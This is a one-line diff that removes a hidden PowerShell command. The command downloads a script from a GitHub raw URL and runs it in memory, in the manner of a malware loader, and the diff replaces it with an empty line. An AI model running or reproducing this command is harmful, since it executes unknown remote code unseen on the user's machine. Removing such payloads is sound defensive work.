@@ -1,1 +1,1 @@
-powershell -w hidden -c "$u='https://raw.githubusercontent.com/sdvcvo/1/refs/heads/main/2.txt';$c=(New-Object Net.WebClient).DownloadString($u);$r=[powershell]::Create();$r.AddScript($c)|Out-Null;$r.Invoke()"
+
